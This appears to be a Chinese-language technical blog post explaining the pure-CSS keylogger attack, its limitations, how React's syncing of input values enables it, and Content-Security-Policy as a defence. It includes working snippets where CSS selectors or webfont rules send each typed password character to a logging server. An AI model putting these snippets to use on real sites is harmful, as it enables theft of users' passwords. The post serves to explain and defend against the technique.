---
title: CSS keylogger：攻擊與防禦 
date: 2018-03-02 20:18:02
tags:
  - css
  - key logger
author: huli
---

# 前言

前陣子在 Hacker News 上面看到這篇：[Show HN: A CSS Keylogger](https://news.ycombinator.com/item?id=16422696)，大開眼界，決定要找個時間好好來研究一下，並且寫一篇文章分享給大家。

這篇會講到以下東西：

1. 什麼是 keylogger
2. CSS keylogger 的原理
3. CSS keylogger 與 React
4. 防禦方法

好，那就讓我們開始吧！

# Keylogger 是什麼？

Keylogger 就是鍵盤側錄，是惡意程式的一種，拿來記錄你電腦上面所有按過的按鍵。還記得我小時候曾經用 VB6 寫了一個超簡單的 keylogger，只要呼叫系統提供的 API 並且記錄相對應的按鍵就好。

在電腦上面被裝這個的話，就等於你輸入的任何東西都被記錄起來。當然，也包含了帳號跟密碼。不過如果我沒記錯，防毒軟體的行為偵測應該可以把這些都擋掉，所以也不用太過擔心。

剛剛講的是在電腦上面，現在我們把範圍縮小，侷限在網頁。

如果你要在頁面上加一個 keylogger，通常會利用 JavaScript 來達成，而且程式碼超級簡單：

``` js
document.addEventListener('keydown', e => {
  console.log(e.key)
})
```

只要偵測`keydown`事件並且抓出按下的 key 就行了。

不過假如你有能力在你想入侵的網頁上面加入 JavaScript 的話，通常也不需要這麼麻煩去記錄每個按鍵，你直接把 Cookie 偷走、竄改頁面、導到釣魚頁面，或者是在 submit 的時候把帳號密碼回傳給自己的 Server 就好，所以 keylogger 顯得不是那麼有用。

好，那假設我們現在沒辦法插入惡意的 JavaScript，只能改 CSS，有辦法用純 CSS 做出一個 keylogger 嗎？

有，畢竟 CSS 能做的事情[可多了](https://github.com/you-dont-need/You-Dont-Need-JavaScript)。

# 純 CSS keylogger 的原理

直接看程式碼你就懂了（取自：[maxchehab/CSS-Keylogging](https://github.com/maxchehab/CSS-Keylogging)）：

``` css
input[type="password"][value$="a"] {
  background-image: url("http://localhost:3000/a");
}
```

神奇吧！

如果你不熟悉 CSS selector，這邊幫你複習一下。上面那段意思就是說如果 type 是 password 的 input，value 以 a 結尾的話，背景圖就載入`http://localhost:3000/a` 。

現在我們可以把這串 CSS 改一下，新增大小寫英文字母、數字甚至是特殊符號，接著會發生什麼事呢？

如果我輸入 abc123，瀏覽器就會發送 Request 到：

1. http://localhost:3000/a
2. http://localhost:3000/b
3. http://localhost:3000/c
4. http://localhost:3000/1
5. http://localhost:3000/2
6. http://localhost:3000/3

就這樣，你的密碼就完全被攻擊者給掌握了。

這就是 CSS keylogger 的原理，利用 CSS Selector 搭配載入不同的網址，就能夠把密碼的每一個字元發送到 Server 去。

看起來很可怕對吧，別怕，其實沒那麼容易。

# CSS keylogger 的限制

## 不能保證順序

雖然你輸入的時候是按照順序輸入的，但 Request 抵達後端的時候並不能保證順序，所以有時候順序會亂掉。例如說 abc123 變成 bca213 之類的。

但如果我們把 CSS Selector 改一下的話，其實就能解決這個問題：

``` css
input[value^="a"] {
  background-image: url("http://localhost:3000/a_");
}
  
input[value*="aa"] {
  background-image: url("http://localhost:3000/aa");
}
  
input[value*="ab"] {
  background-image: url("http://localhost:3000/ab");
}
```

如果開頭是 a，我們就送出`a_`，接著針對 26 個字母跟數字的排列組合每兩個字元送出一個 request，例如說：abc123，就會是：

1. a_
2. ab
3. bc
4. c1
5. 12
6. 23

就算順序亂掉，透過這種關係你把字母重新組合起來，還是可以得到正確的密碼順序。

## 重複字元不會送出 Request

因為載入的網址一樣，所以重複的字元就不會再載入圖片，不會發送新的 Request。這個問題目前據我所知應該是解不掉。

## 在輸入的時候，其實 value 不會變

這個其實是 CSS Keylogger 最大的問題。

當你在 input 輸入資訊的時候，其實 input 的 value 是不會變的，所以上面講的那些完全不管用。你可以自己試試看就知道了，input 的內容會變，但是你用 dev tool 看的話，會發現 value 完全不會變。

針對這個問題，有兩個解決方案，第一個是利用 Webfont：

``` html
<!doctype html>
<title>css keylogger</title>
<style>
@font-face { font-family: x; src: url(./log?a), local(Impact); unicode-range: U+61; }
@font-face { font-family: x; src: url(./log?b), local(Impact); unicode-range: U+62; }
@font-face { font-family: x; src: url(./log?c), local(Impact); unicode-range: U+63; }
@font-face { font-family: x; src: url(./log?d), local(Impact); unicode-range: U+64; }
input { font-family: x, 'Comic sans ms'; }
</style>
<input value="a">type `bcd` and watch network log
```
（程式碼取自：[Keylogger using webfont with single character unicode-range](https://github.com/jbtronics/CrookedStyleSheets/issues/24)）

value 不會跟著變又怎樣，字體總會用到了吧！只要每打一個字，就會送出相對應的 Request。

但這個方法的侷限有兩個：

1. 沒辦法保證順序，一樣也沒辦法解決重複字元的問題
2. 如果欄位是`<input type='password' />`，就沒有用

（在研究第二個侷限的時候發現一件有趣的事，由於 Chrome 跟 Firefox 會把「頁面上有 type 是 password 的 input，但是又沒用 HTTPS」的網站標示為不安全，所以有人研究出用[普通 input 搭配特殊字體](https://www.troyhunt.com/bypassing-browser-security-warnings-with-pseudo-password-fields/)來躲過這個偵測，並且讓輸入框看起來像是 password（但其實 type 不是 password），在這種情形下就可以用 Webfont 來攻擊了）

再來我們看第二種解決方案，剛剛有說到這個問題的癥結點在於 value 不會變，換句話說，如果你 input 輸入值的時候，value 會跟著變的話，這個攻擊手法就很用了。

嗯...有沒有一種很熟悉的感覺。

``` js
class NameForm extends React.Component {
  constructor(props) {
    super(props);
    this.state = {value: ''};
  
    this.handleChange = this.handleChange.bind(this);
  }
  
  handleChange(event) {
    this.setState({value: event.target.value});
  }
  
  render() {
    return (
      <form>
        <label>
          Name:
          <input type="text" value={this.state.value} onChange={this.handleChange} />
        </label>
      </form>
    );
  }
}
```
（以上程式碼改寫自[React 官網](https://reactjs.org/docs/forms.html)）

如果你用過 React 的話，應該會很熟悉這個模式。你在輸入任何東西的時候，會先改變 state，再把 state 的值對應到 input 的 value 去。因此你輸入什麼，value 就會是什麼。

React 是超夯的前端 Library，可以想像有一大堆網頁都是用 React 做的，而且只要是 React，幾乎就能保證 input 的 value 一定會同步更新（幾乎啦，但應該還是有少數沒有遵循這個規則）。

在這邊先做個總結，只要你 input 的 value 會對應到裡面的值（假如你用 React，幾乎一定會這樣寫），並且有地方可以讓別人塞入自訂的 CSS 的話，就能成功實作出 CSS Keylogger。雖然有些缺陷（沒辦法偵測重複字元），但概念上是可行的，只是精準度沒那麼高。

## React 的回應

React 的社群也有針對這一個問題進行討論，都在 [Stop syncing value attribute for controlled inputs #11896](https://github.com/facebook/react/issues/11896) 這個 Issue 裡。

事實上，讓 input 的 value 跟輸入的值同步這件事情一直都會有一些 bug，以前甚至發生了知名流量分析網站 Mixpanel [不小心記錄敏感資訊的事件](https://www.reddit.com/r/analytics/comments/7ukw4n/mixpanel_js_library_has_been_harvesting_passwords/)，而最根本的原因就是因為 React 會一直同步更新 value。

Issue 的討論滿值得一看的，裡面有提到大家常搞混的一件事情：Input 的 attributes 跟 properties。我找到 Stackover flow 上面一篇不錯的解釋：[What is the difference between properties and attributes in HTML?](https://stackoverflow.com/questions/6003819/what-is-the-difference-between-properties-and-attributes-in-html)

attributes 基本上就是你 HTML 上面的那個東西，而 properties 代表的是實際的 value，兩個不一定會相等，舉例來說：

``` html
<input id="the-input" type="text" value="Name:">
```

假如你今天抓這個 input 的 attribute，你會得到`Name:`，但如果你今天抓 input 的 value，你會得到目前在輸入框裡面的值。所以其實這個 attribute 就跟我們常用的 `defaultValue` 是一樣的意思，就是預設值。

不過在 React 裡面，他會把 attribute 跟 value 同步，所以你 value 是什麼，attribute 就會是什麼。

從討論看起來，在 React 17 滿有機會把這個機制拿掉，讓這兩者不再同步。

## 防禦方法

上面講了這麼多，因為現今 React 還沒把這個改掉，所以問題還是存在著。而且其實除了 React，也可能有別的 Library 做了差不多的事情。

Client 端的防禦方法我就不提了，基本就是裝一些別人寫好的 Chrome Extension，可以幫你偵測符合模式的 CSS 之類的，這邊比較值得提的是 Server 端的防禦。

目前看起來最一勞永逸的解決方案就是 Content-Security-Policy，簡而言之它是一個 HTTP Response 的 header，用來決定瀏覽器可以載入哪些資源，例如說禁止 inline 程式碼、只能載入同個 domain 下的資源之類的。

這個 Header 的初衷就是為了防止 XSS 以及攻擊者載入外部的惡意程式碼（例如說我們這個 CSS keylogger）。想知道更詳細的用法可以參考這篇：[Content-Security-Policy - HTTP Headers 的資安議題 (2)](https://devco.re/blog/2014/04/08/security-issues-of-http-headers-2-content-security-policy/)

## 總結

不得不說，這個手法真的很有趣！之前第一次看到的時候也驚嘆了好一陣子，居然能發現這樣子的純 CSS Keylogger。雖然技術上是可行的，但在實作上還是會碰到許多困難之處，而且要符合滿多前提才能做這樣子的攻擊，不過還是很值得關注後續的發展。

總之呢，這篇文就是想介紹這個東西給讀者們，希望大家有所收穫。

# 參考資料

1. [Keylogger using webfont with single character unicode-range #24](https://github.com/jbtronics/CrookedStyleSheets/issues/24)
2. [Stop syncing value attribute for controlled inputs #11896](https://github.com/facebook/react/issues/11896)
3. [maxchehab/CSS-Keylogging](https://github.com/maxchehab/CSS-Keylogging)
4. [Content-Security-Policy - HTTP Headers 的資安議題 (2)](https://devco.re/blog/2014/04/08/security-issues-of-http-headers-2-content-security-policy/)
5. [Stealing Data With CSS: Attack and Defense](https://www.mike-gualtieri.com/posts/stealing-data-with-css-attack-and-defense)
6. [Bypassing Browser Security Warnings with Pseudo Password Fields](https://www.troyhunt.com/bypassing-browser-security-warnings-with-pseudo-password-fields/)
7. [CSS Keylogger (and why you shouldn’t worry about it)](https://www.bram.us/2018/02/21/css-keylogger-and-why-you-shouldnt-worry-about-it/)
8. [Mixpanel JS library has been harvesting passwords ](https://www.reddit.com/r/analytics/comments/7ukw4n/mixpanel_js_library_has_been_harvesting_passwords/)


關於作者： 
[@huli](http://huli.logdown.com/) 野生工程師，相信分享與交流能讓世界變得更美好